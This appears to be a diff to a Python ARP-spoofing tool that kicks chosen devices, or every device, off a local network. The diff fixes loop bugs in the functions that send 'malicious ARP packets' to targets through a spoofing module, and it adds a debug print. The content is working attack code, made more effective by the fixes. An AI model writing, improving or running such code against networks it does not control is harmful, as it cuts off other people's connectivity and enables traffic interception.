@@ -220,6 +220,7 @@ def K1CKoneoff():
     while True:
         try:
             choice = int(input("\n\t{0}CH00SE the target:-{1} ".format(WHITE, END))) - 1
+            print("HOST ===", hosts_list)
             target_host = hosts_list[choice]
             target_ip = target_host['ip']
             target_mac =target_host['mac']
@@ -280,7 +281,7 @@ def K1CKsomeoff():
         while True:
             # broadcast malicious ARP packets (10p/s)
             for i in some_targets:
-                target_host = hosts_list[choice]
+                target_host = hosts_list[i]
                 target_ip = target_host['ip']
                 target_mac =target_host['mac']
                 R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, target_ip, target_mac)
@@ -311,8 +312,8 @@ def K1CKalloff():
         start = time.time()
         reScan = 0
         while True:
-            for i in imv:
-                target_host = hosts_list[choice]
+            for i in range(len(hosts_list)):
+                target_host = hosts_list[i]
                 target_ip = target_host['ip']
                 target_mac =target_host['mac']
                 R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, target_ip, target_mac)
